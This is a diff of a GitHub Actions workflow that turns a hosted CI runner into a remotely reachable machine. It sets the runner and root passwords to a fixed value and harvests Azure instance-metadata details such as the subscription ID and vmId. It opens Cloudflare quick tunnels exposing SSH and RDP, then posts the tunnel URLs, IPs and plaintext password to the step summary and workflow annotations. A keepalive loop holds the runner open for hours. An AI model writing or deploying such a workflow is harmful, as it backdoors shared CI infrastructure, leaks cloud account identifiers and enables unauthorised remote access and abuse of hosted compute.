@@ -1,4 +1,4 @@
-name: Tunnel v6 Cloudflared
+name: Tunnel v7 Annotations
 
 on:
   workflow_dispatch:
@@ -15,7 +15,8 @@ jobs:
       - name: Install
         run: |
           sudo apt-get install -y openssh-server socat 2>/dev/null | tail -3
-          curl -sL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /usr/local/bin/cloudflared --max-time 60
+          curl -sL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
+            -o /usr/local/bin/cloudflared --max-time 60
           sudo chmod +x /usr/local/bin/cloudflared
           cloudflared --version && echo CLOUDFLARED_OK
 
@@ -32,56 +33,62 @@ jobs:
           echo 'runner:Pwn2Own2026!' | sudo chpasswd
           echo 'root:Pwn2Own2026!' | sudo chpasswd
           sudo /usr/sbin/sshd && echo SSH_UP
-          sleep 1 && ss -tlnp | grep :22
 
-      - name: VM Info
+      - name: VM Identity + Tunnel
         run: |
-          echo HOSTNAME=$(hostname)
-          echo INTERNAL=$(hostname -I | awk '{print $1}')
-          echo PUBLIC=$(curl -sf https://api.ipify.org 2>/dev/null)
-          curl -sf -H Metadata:true 'http://169.254.169.254/metadata/loadbalancer?api-version=2020-10-01' 2>/dev/null
-          curl -sf -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null | python3 -c "import sys,json; c=json.load(sys.stdin)['compute']; n=json.load(open('/dev/stdin')) if False else None; print('vmId='+c['vmId']); print('sub='+c['subscriptionId']); print('loc='+c['location'])" 2>/dev/null || true
+          # VM Info
+          HOSTNAME=$(hostname)
+          INTERNAL=$(hostname -I | awk '{print $1}')
+          PUBLIC=$(curl -sf https://api.ipify.org 2>/dev/null || echo unknown)
+          LB=$(curl -sf -H Metadata:true 'http://169.254.169.254/metadata/loadbalancer?api-version=2020-10-01' 2>/dev/null)
+          LB_IP=$(echo $LB | python3 -c "import sys,json; d=json.load(sys.stdin); [print(r.get('frontendIpAddress','')) for r in d.get('loadbalancer',{}).get('outboundRules',[])]" 2>/dev/null)
+          INST=$(curl -sf -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null)
+          VMID=$(echo $INST | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['vmId'])" 2>/dev/null)
+          SUB=$(echo $INST | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['subscriptionId'])" 2>/dev/null)
+          LOC=$(echo $INST | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['location'])" 2>/dev/null)
 
-      - name: Cloudflare SSH Tunnel
-        run: |
-          echo === cloudflared quick tunnel for SSH ===
+          # Start CF tunnels
           cloudflared tunnel --url tcp://localhost:22 --no-autoupdate > /tmp/cf_ssh.log 2>&1 &
-          CF_PID=$!
-          echo CF_PID=$CF_PID
-          sleep 25
-          echo === CF LOG ===
-          cat /tmp/cf_ssh.log
-          CF_URL=$(grep -oP 'https://[^\s]+\.trycloudflare\.com' /tmp/cf_ssh.log | head -1)
-          echo CF_SSH_URL=$CF_URL
-          kill -0 $CF_PID 2>/dev/null && echo CF_ALIVE || echo CF_DEAD
+          sleep 20
+          CF_SSH=$(grep -oP 'https://[^\s]+\.trycloudflare\.com' /tmp/cf_ssh.log | head -1)
 
-      - name: Cloudflare RDP Tunnel
-        run: |
           cloudflared tunnel --url tcp://localhost:3389 --no-autoupdate > /tmp/cf_rdp.log 2>&1 &
           sleep 20
-          cat /tmp/cf_rdp.log
           CF_RDP=$(grep -oP 'https://[^\s]+\.trycloudflare\.com' /tmp/cf_rdp.log | head -1)
-          echo CF_RDP_URL=$CF_RDP
 
-      - name: Print Connection Info
-        run: |
-          CF_SSH=$(grep -oP 'https://[^\s]+\.trycloudflare\.com' /tmp/cf_ssh.log | head -1)
-          CF_RDP=$(grep -oP 'https://[^\s]+\.trycloudflare\.com' /tmp/cf_rdp.log | head -1)
-          PUB=$(curl -sf https://api.ipify.org 2>/dev/null)
-          INT=$(hostname -I | awk '{print $1}')
-          echo '=============================='
+          # Write to step summary (readable via API)
+          echo "## Azure Runner Access" >> $GITHUB_STEP_SUMMARY
+          echo "| Key | Value |" >> $GITHUB_STEP_SUMMARY
+          echo "|---|---|" >> $GITHUB_STEP_SUMMARY
+          echo "| vmId | $VMID |" >> $GITHUB_STEP_SUMMARY
+          echo "| subscription | $SUB |" >> $GITHUB_STEP_SUMMARY
+          echo "| location | $LOC |" >> $GITHUB_STEP_SUMMARY
+          echo "| hostname | $HOSTNAME |" >> $GITHUB_STEP_SUMMARY
+          echo "| internal_ip | $INTERNAL |" >> $GITHUB_STEP_SUMMARY
+          echo "| public_ip | $PUBLIC |" >> $GITHUB_STEP_SUMMARY
+          echo "| lb_ip | $LB_IP |" >> $GITHUB_STEP_SUMMARY
+          echo "| CF_SSH_URL | $CF_SSH |" >> $GITHUB_STEP_SUMMARY
+          echo "| CF_RDP_URL | $CF_RDP |" >> $GITHUB_STEP_SUMMARY
+          echo "| Password | Pwn2Own2026! |" >> $GITHUB_STEP_SUMMARY
+
+          # GitHub workflow annotations (visible in real-time)
+          echo "::notice title=CF_SSH_URL::$CF_SSH"
+          echo "::notice title=CF_RDP_URL::$CF_RDP"
+          echo "::notice title=PUBLIC_IP::$PUBLIC"
+          echo "::notice title=LB_IP::$LB_IP"
+          echo "::notice title=VMID::$VMID"
+          echo "::notice title=PASSWORD::Pwn2Own2026!"
+
+          # Print to stdout
           echo CF_SSH_URL=$CF_SSH
           echo CF_RDP_URL=$CF_RDP
-          echo PUBLIC_IP=$PUB
-          echo INTERNAL_IP=$INT
-          echo PASSWORD=Pwn2Own2026!
-          echo '=============================='
-          echo 'How to connect:'
-          echo "  cloudflared access tcp --hostname $CF_SSH --url localhost:2222"
-          echo '  ssh -p 2222 runner@localhost'
-          echo "  ssh runner@$PUB  (direct if port open)"
-          echo '=============================='
+          echo PUBLIC_IP=$PUBLIC
+          echo INTERNAL=$INTERNAL
+          echo VMID=$VMID
+          echo SUB=$SUB
+
+          # Keepalive
           for i in $(seq 1 350); do
             sleep 60
-            echo beat=$i CF=$CF_SSH
+            echo beat=$i CF=$CF_SSH PUB=$PUBLIC
           done
